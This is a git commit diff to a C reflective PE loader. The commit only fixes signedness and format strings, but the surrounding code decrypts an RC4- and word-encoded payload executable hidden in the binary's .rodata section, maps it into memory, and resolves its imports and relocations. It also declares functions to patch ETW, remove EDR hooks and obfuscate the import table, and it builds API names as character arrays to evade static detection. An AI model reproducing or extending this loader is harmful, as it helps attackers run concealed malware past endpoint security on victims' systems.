11bec66e80fd63d67fe7a19086d3bf1447748bfd
Adrian Lohr <mail@adrianlohr.de>
2023-11-09 20:57:45 +0100

    fix: signs and implicit conversions

--- src/reflective_loader.c
+++ src/reflective_loader.c
@@ -15,7 +15,7 @@
 #define INFLATION_FACTOR 3 // is equal to word length for word encoding
 
 // Declarations
-void* load_pe (char* PE_data);
+void* load_pe (unsigned char* pe_data);
 void obfuscate_import_table(void);
 void patch_etw(void);
 void remove_edr_hooks(void);
@@ -39,18 +39,18 @@ unsigned char sGetCurrentProcess[] = {'G','e','t','C','u','r','r','e','n','t','P
 unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
 unsigned char sNtdll[] = { 'N','t','d','l','l', 0x0 };
 
-char* wordlist[256] = {"raw\0", "moo\0", "zed\0", "nun\0", "hin\0", "ado\0", "vim\0", "lip\0", "tic\0", "pet\0", "xis\0", "tux\0", "jut\0", "zap\0", "fry\0", "ewe\0", "ice\0", "ink\0", "ask\0", "lay\0", "pod\0", "yam\0",
-                        "dig\0", "paw\0", "den\0", "ohm\0", "jay\0", "cog\0", "vex\0", "rot\0", "mop\0", "fad\0", "ode\0", "jow\0", "joy\0", "thy\0", "hex\0", "eel\0", "ape\0", "hum\0", "wop\0", "era\0", "jag\0", "toe\0",
-                        "zit\0", "nab\0", "cop\0", "jug\0", "mad\0", "oaf\0", "zag\0", "tat\0", "yen\0", "gym\0", "hop\0", "gab\0", "jab\0", "end\0", "tug\0", "tax\0", "bud\0", "bag\0", "wok\0", "bug\0", "yak\0", "god\0",
-                        "tad\0", "off\0", "fee\0", "mud\0", "nap\0", "hid\0", "dew\0", "add\0", "jar\0", "rag\0", "bus\0", "new\0", "hog\0", "vat\0", "jib\0", "jog\0", "gin\0", "red\0", "jam\0", "tee\0", "nut\0", "ale\0", 
-                        "sue\0", "arc\0", "top\0", "fin\0", "fly\0", "ear\0", "awe\0", "pen\0", "jig\0", "ate\0", "qua\0", "cam\0", "gut\0", "pad\0", "cob\0", "saw\0", "lid\0", "haw\0", "wag\0", "ram\0", "cow\0", "any\0",
-                        "bay\0", "elk\0", "owl\0", "aim\0", "rut\0", "dug\0", "yet\0", "cup\0", "fit\0", "oar\0", "pun\0", "ebb\0", "won\0", "coy\0", "urn\0", "fog\0", "kin\0", "qed\0", "sty\0", "tag\0", "gig\0", "wad\0",
-                        "vet\0", "ore\0", "fed\0", "jot\0", "bop\0", "gay\0", "run\0", "ivy\0", "tan\0", "lob\0", "tab\0", "gun\0", "fix\0", "big\0", "sit\0", "gem\0", "din\0", "sum\0", "hip\0", "cod\0", "rib\0", "bun\0",
-                        "eon\0", "zip\0", "bib\0", "van\0", "zoo\0", "dam\0", "ion\0", "woe\0", "nib\0", "hen\0", "ash\0", "yes\0", "dot\0", "rum\0", "ago\0", "mug\0", "icy\0", "sky\0", "ova\0", "ton\0", "ill\0", "nip\0",
-                        "ham\0", "jet\0", "tap\0", "sax\0", "lot\0", "bee\0", "sob\0", "mob\0", "sir\0", "why\0", "toy\0", "foe\0", "maw\0", "bet\0", "lei\0", "bid\0", "met\0", "bye\0", "box\0", "vie\0", "elm\0", "rue\0",
-                        "bed\0", "yep\0", "rye\0", "rub\0", "him\0", "mix\0", "wax\0", "boo\0", "way\0", "axe\0", "hut\0", "oak\0", "dye\0", "lap\0", "wed\0", "lug\0", "eve\0", "cub\0", "nod\0", "oat\0", "ace\0", "cab\0",
-                        "awl\0", "kit\0", "hay\0", "ran\0", "fig\0", "car\0", "dim\0", "log\0", "gad\0", "fox\0", "imp\0", "bog\0", "dip\0", "wry\0", "gas\0", "cot\0", "keg\0", "dab\0", "one\0", "air\0", "pat\0", "yip\0",
-                        "few\0", "yap\0", "nag\0", "gum\0", "pan\0", "orb\0", "ant\0", "zen\0", "hob\0", "gap\0", "pew\0", "men\0", "egg\0", "pal\0"};
+const char* wordlist[256] = {"raw", "moo", "zed", "nun", "hin", "ado", "vim", "lip", "tic", "pet", "xis", "tux", "jut", "zap", "fry", "ewe", "ice", "ink", "ask", "lay", "pod", "yam",
+                        "dig", "paw", "den", "ohm", "jay", "cog", "vex", "rot", "mop", "fad", "ode", "jow", "joy", "thy", "hex", "eel", "ape", "hum", "wop", "era", "jag", "toe",
+                        "zit", "nab", "cop", "jug", "mad", "oaf", "zag", "tat", "yen", "gym", "hop", "gab", "jab", "end", "tug", "tax", "bud", "bag", "wok", "bug", "yak", "god",
+                        "tad", "off", "fee", "mud", "nap", "hid", "dew", "add", "jar", "rag", "bus", "new", "hog", "vat", "jib", "jog", "gin", "red", "jam", "tee", "nut", "ale", 
+                        "sue", "arc", "top", "fin", "fly", "ear", "awe", "pen", "jig", "ate", "qua", "cam", "gut", "pad", "cob", "saw", "lid", "haw", "wag", "ram", "cow", "any",
+                        "bay", "elk", "owl", "aim", "rut", "dug", "yet", "cup", "fit", "oar", "pun", "ebb", "won", "coy", "urn", "fog", "kin", "qed", "sty", "tag", "gig", "wad",
+                        "vet", "ore", "fed", "jot", "bop", "gay", "run", "ivy", "tan", "lob", "tab", "gun", "fix", "big", "sit", "gem", "din", "sum", "hip", "cod", "rib", "bun",
+                        "eon", "zip", "bib", "van", "zoo", "dam", "ion", "woe", "nib", "hen", "ash", "yes", "dot", "rum", "ago", "mug", "icy", "sky", "ova", "ton", "ill", "nip",
+                        "ham", "jet", "tap", "sax", "lot", "bee", "sob", "mob", "sir", "why", "toy", "foe", "maw", "bet", "lei", "bid", "met", "bye", "box", "vie", "elm", "rue",
+                        "bed", "yep", "rye", "rub", "him", "mix", "wax", "boo", "way", "axe", "hut", "oak", "dye", "lap", "wed", "lug", "eve", "cub", "nod", "oat", "ace", "cab",
+                        "awl", "kit", "hay", "ran", "fig", "car", "dim", "log", "gad", "fox", "imp", "bog", "dip", "wry", "gas", "cot", "keg", "dab", "one", "air", "pat", "yip",
+                        "few", "yap", "nag", "gum", "pan", "orb", "ant", "zen", "hob", "gap", "pew", "men", "egg", "pal"};
 
 int main(int argc, char** argv) {
 
@@ -82,36 +82,36 @@ int main(int argc, char** argv) {
     }
     fseek(loader_file, 0L, SEEK_SET);
 
-    size_t encrypted_size = *(int64_t*)(size_buffer);
-    char *key_hexstring = (size_buffer+8);
+    size_t encrypted_size = (size_t)*(int64_t*)(size_buffer);
+    char *key_hexstring = (size_buffer + 8);
     DEBUG_PRINT("[info] Encrypted size: %i\n", encrypted_size);
     DEBUG_PRINT("[info] Obfuscated Decode key: %.32s\n", key_hexstring);
 
-    char* loader_handle = (char*)GetModuleHandleA(NULL);
+    unsigned char* loader_handle = (unsigned char*)GetModuleHandleA(NULL);
 
     IMAGE_DOS_HEADER* p_DOS_HDR  = (IMAGE_DOS_HEADER*) loader_handle;
     IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) (((char*) p_DOS_HDR) + p_DOS_HDR->e_lfanew);
     IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*) (p_NT_HDR + 1);
 
-    char* payload_PE = NULL;
-    char payload_PE_section_name[] = ".rodata";
+    unsigned char* payload_pe = NULL;
+    unsigned char payload_pe_section_name[] = ".rodata";
 
     for(int i = 0; i < p_NT_HDR->FileHeader.NumberOfSections; ++i) {
-        if (!strcmp(sections[i].Name, payload_PE_section_name)) {
+        if (!strcmp(sections[i].Name, payload_pe_section_name)) {
             DEBUG_PRINT("[info] Found .rodata section\n");
-            payload_PE = loader_handle + sections[i].VirtualAddress;
-            DEBUG_PRINT("[info] Payload PE at VA: 0x%.8x\n", *payload_PE);
+            payload_pe = loader_handle + sections[i].VirtualAddress;
+            DEBUG_PRINT("[info] Payload PE at VA: 0x%.8x\n", *payload_pe);
             break;
         }
     }
 
-    if(payload_PE == NULL) {
+    if(payload_pe == NULL) {
         DEBUG_PRINT("[error] Couldn't find payload PE\n");
         return 1;   
     }
 
-    char* pe_buf = malloc(encrypted_size);
-    memcpy(pe_buf, payload_PE, encrypted_size);
+    unsigned char* pe_buf = malloc(encrypted_size);
+    memcpy(pe_buf, payload_pe, encrypted_size);
 
     const char *pos = key_hexstring;
     unsigned char key[KEY_LENGTH];
@@ -122,9 +122,9 @@ int main(int argc, char** argv) {
     }
 
     DEBUG_PRINT("[info] Decrypt PE\n");
-    memcpy(pe_buf, payload_PE, encrypted_size);
+    memcpy(pe_buf, payload_pe, encrypted_size);
     size_t original_size = encrypted_size/INFLATION_FACTOR;
-    char *decoded_buf = malloc(original_size);
+    unsigned char *decoded_buf = malloc(original_size);
     memset(decoded_buf, 0, original_size);
     decrypt_pe(pe_buf, decoded_buf, encrypted_size, original_size, key);
 
@@ -142,9 +142,9 @@ int main(int argc, char** argv) {
     return 0;
 }
 
-void* load_pe(char* PE_data) {
+void* load_pe(unsigned char* pe_data) {
     // DEFINITIONS OF HEADERS AND CO.
-    IMAGE_DOS_HEADER* p_DOS_HDR  = (IMAGE_DOS_HEADER*) PE_data;
+    IMAGE_DOS_HEADER* p_DOS_HDR  = (IMAGE_DOS_HEADER*) pe_data;
     IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) (((char*) p_DOS_HDR) + p_DOS_HDR->e_lfanew);
     IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*) (p_NT_HDR + 1); 
 
@@ -154,24 +154,24 @@ void* load_pe(char* PE_data) {
     DWORD size_of_headers = p_NT_HDR->OptionalHeader.SizeOfHeaders;
     WORD num_of_sections = p_NT_HDR->FileHeader.NumberOfSections;
 
-     DEBUG_PRINT("[info] hdr_image_base:%i\n\
-            size_of_image:%i\n\
-            entry_point_RVA:%i\n\
-            size_of_headers:%i\n\
+     DEBUG_PRINT("[info] hdr_image_base:%lu\n\
+            size_of_image:%lu\n\
+            entry_point_RVA:%lu\n\
+            size_of_headers:%lu\n\
             num_of_sections:%i\n", hdr_image_base, size_of_image, entry_point_RVA, size_of_headers, num_of_sections);
 
     char* image_base = (char*)fnVirtualAlloc(NULL, size_of_image, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     if(image_base == NULL) return NULL; // allocation didn't work
 
     // COPY HEADERS TO MEMORY
-    memcpy(image_base, PE_data, size_of_headers);
+    memcpy(image_base, pe_data, size_of_headers);
     // Copy PE section wise into memory
     for (int i = 0; i < num_of_sections; ++i) {
         char* dest_addr = image_base + sections[i].VirtualAddress;
         DWORD raw_data_size = sections[i].SizeOfRawData;
 
         if (raw_data_size > 0) {
-            memcpy(dest_addr, PE_data + sections[i].PointerToRawData, raw_data_size);
+            memcpy(dest_addr, pe_data + sections[i].PointerToRawData, raw_data_size);
         } else {
             memset(dest_addr, 0, sections[i].Misc.VirtualSize);
         }
@@ -209,7 +209,7 @@ void* load_pe(char* PE_data) {
             } else {
                 // import by ordinal, directly
                 DWORD ordinal_num = lookup_addr & (~IMAGE_ORDINAL_FLAG);
-                DEBUG_PRINT("[info] Import by ordinal %u directly\n", ordinal_num);
+                DEBUG_PRINT("[info] Import by ordinal %lu directly\n", ordinal_num);
                 function_handle = (void *)GetProcAddress(import_module, MAKEINTRESOURCEA(lookup_addr));
             }
 
@@ -235,7 +235,7 @@ void* load_pe(char* PE_data) {
 
             DWORD size = (p_reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/2;
             WORD* reloc = (WORD*) (p_reloc + 1);
-            for (int i = 0; i < size; ++i) {
+            for (long unsigned int i = 0; i < size; ++i) {
                 int type = reloc[i] >> 12;
                 int offset = reloc[i] & 0x0fff;
                 DWORD* change_addr = (DWORD*) (image_base + p_reloc->VirtualAddress + offset);
@@ -307,7 +307,7 @@ void patch_etw(void) {
 
 // =============== DEOBFUSCATION HERE ================
 
-char decode_word(char* word) {
+unsigned char decode_word(char* word) {
     for (int i = 0; i < 256; i++) {
         if (!strcmp(wordlist[i], word)) {
             return (char)i;
@@ -348,8 +348,8 @@ void rc4_init(unsigned char *s, unsigned char *key) {
     }
 }
 
-void rc4_crypt(unsigned char *s, unsigned char *data, int data_len) {
-    int i = 0, j = 0, k;
+void rc4_crypt(unsigned char *s, unsigned char *data, unsigned int data_len) {
+    unsigned int i = 0, j = 0, k;
     for (k = 0; k < data_len; k++) {
         i = (i + 1) % 256;
         j = (j + s[i]) % 256;
@@ -366,9 +366,9 @@ int decrypt_pe(unsigned char *pe_buf, unsigned char *decode_buf, size_t encrypte
     DEBUG_PRINT("[info] Last prime number: %llu\n", last_prime);
    
     // word decode
-    char *decode_pos = decode_buf;
+    unsigned char *decode_pos = decode_buf;
     for (size_t i = 0; i < encrypted_size; i += INFLATION_FACTOR) {
-        char word[4] = {pe_buf[i], pe_buf[i+1], pe_buf[i+2], '\0'};
+        char word[4] = {(char)pe_buf[i], (char)pe_buf[i+1], (char)pe_buf[i+2], '\0'};
         *decode_pos = decode_word(word);
         decode_pos++;
     }
